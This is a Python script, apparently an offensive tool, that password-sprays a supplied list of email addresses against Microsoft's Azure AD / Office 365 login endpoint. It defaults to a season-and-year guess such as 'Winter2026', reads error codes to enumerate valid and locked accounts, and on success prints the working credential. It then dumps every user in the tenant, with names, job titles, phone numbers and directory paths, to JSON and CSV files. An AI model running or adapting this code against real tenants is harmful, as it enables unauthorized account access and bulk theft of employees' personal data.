#!/usr/bin/env python3
#!/usr/bin/python3
import queue
import threading
import requests
import sys
import json
import datetime
import time

def loginValidity(emails, password):
        def getAllUsers(response, email):
                #This function is based off of the requests sent when using the powershell function "Get-AzureADUser"
                #The tennant is the domain name
                tennant = email[email.find("@")+1:]
                resource = response["resource"]
                #Use the resource specified in the response to the login, and request up to 999 users from the API
                url = resource + "/" + tennant + "/users?api-version=1.6&%24top=999"
                #Include the login token recieved in the response to the login
                header = {"Accept": "application/json", "Authorization": response["token_type"] + " " + response["access_token"], "cmdlet-na": "Get-AzureADUser", "client-request-id": "03471fbe-d9fd-4992-87f0-42d9cc49c7e0", "User-Agent": "Swagger-Codegen/1.4.0.0/csharp"}
                response = requests.get(url, headers=header)
                #The response text will be JSON with the users and all of their Azure AD attributes
                responseArray = json.loads(response.text)
                users = responseArray["value"]
                while "odata.nextLink" in responseArray:
                        skiptoken = responseArray["odata.nextLink"]
                        skiptoken = skiptoken[skiptoken.find("skiptoken=")+10:]
                        url = resource + "/" + tennant + "/users?api-version=1.6&%24top=999&%24skiptoken=" + skiptoken
                        response = requests.get(url, headers=header)
                        responseArray = json.loads(response.text)
                        users.extend(responseArray["value"])

                filename = tennant[:tennant.rfind(".")]
                outputData(users, filename)

        def outputData(users, filename):
                with open(filename + "-O365-Dump.json", "w") as f:
                        f.write(json.dumps(users, indent=4))
                usersOut = []
                biggest = [0, 0, 0, 0, 0, 0, 0]
                for user in users:
                        data = [user["displayName"], user["jobTitle"], user["mail"], user["userPrincipalName"], user["telephoneNumber"], str(user["accountEnabled"]), user["onPremisesDistinguishedName"]]
                        for i, item in enumerate(data):
                                if item is None:
                                        data[data.index(item)] = ""
                                else:
                                        data[data.index(item)] = item.strip()
                        usersOut.append(data)
                with open(filename + "-O365-Dump.csv", "w") as out:
                        out.write(u"\"Display Name\",\"Job Title\",\"Email\",\"User Principal Name\",\"Phone Number\",\"Account Enabled\",\"On Premises DN\"\n")
                        for user in usersOut:
                                out.write("\"" + "\",\"".join(user) + "\"\n")
                print("Your files have been saved as:\n\t" + filename + "-O365-Dump.csv\n\t" + filename + "-O365-Dump.json")

        def parseError(responseArray, email):
                errorDescription = responseArray["error_description"]
                errorCode = errorDescription.split(":")[0]
                if errorCode == "AADSTS50034":
                        invalid.append(email)
                elif errorCode == "AADSTS50126":
                        print(email)
                elif errorCode == "AADSTS50053":
                        tryLater.append(email)
                else:
                        errors.append(email + "\n" + errorDescription.split("\r\n")[0] + "\n")

        def testEmails(list):
                for email in list:
                        response = requests.post("https://login.microsoftonline.com/Common/oauth2/token", data={"grant_type": "password", "username": email, "password": password, "client_id": clientID, "resource": "https://graph.windows.net", "scope": "openid"})
                        responseArray = json.loads(response.text)
                        #An error description is only included if the login fails
                        if "error_description" in responseArray:
                                if email in tryLater:
                                        tryLater.remove(email)
                                parseError(responseArray, email)
                        else:
                                #If the login is successful, let's just dump all the users from O365
                                print(email)
                                print("\n\tCorrect password, " + email + ":" + password + "\n\tExtracting all users from O365\n")
                                getAllUsers(responseArray, email)
                                sys.exit()

        if password == "":
                seasons = ["Winter", "Spring", "Summer", "Fall"]
                seasonInt = int((int((datetime.datetime.now()).strftime("%m"))-1)/3)
                year = (datetime.datetime.now() - datetime.timedelta(days=30)).strftime("%Y")
                password = seasons[seasonInt] + year

        clientID = '1b730954-1685-4b74-9bfd-dac224a7b894'

        print("Attempting to find valid users, using password: " + password)
        print("Valid emails:")
        testEmails(emails)

def usage():
        print("Office 365 Validity Tester\n\nExamples:\n\t" + sys.argv[0] + " ./emailList.txt\n\t" + sys.argv[0] + " ./emails.txt Password1")
        sys.exit(0)

def parseArgs():
        password = ""
        if len(sys.argv) < 2:
                usage()
        emailFile = sys.argv[1]
        if len(sys.argv) > 2:
                password = sys.argv[2]
        emailList = open(emailFile).read().splitlines()
        while "" in emailList:
                emailList.remove("")
        return (emailList, password)

if __name__ == '__main__':
        emailList, password = parseArgs()

        invalid = []
        tryLater = []
        errors = []

        loginValidity(emailList, password)

        if invalid:
                print("\n\nInvalid emails:")
                for email in invalid:
                        print(email)

        if tryLater:
                print("\nRate limiting prevented testing these users, try them again later")
                for email in tryLater:
                        print(email)

        if errors:
                print("\nErrors:\n")
                for error in errors:
                        print(error)
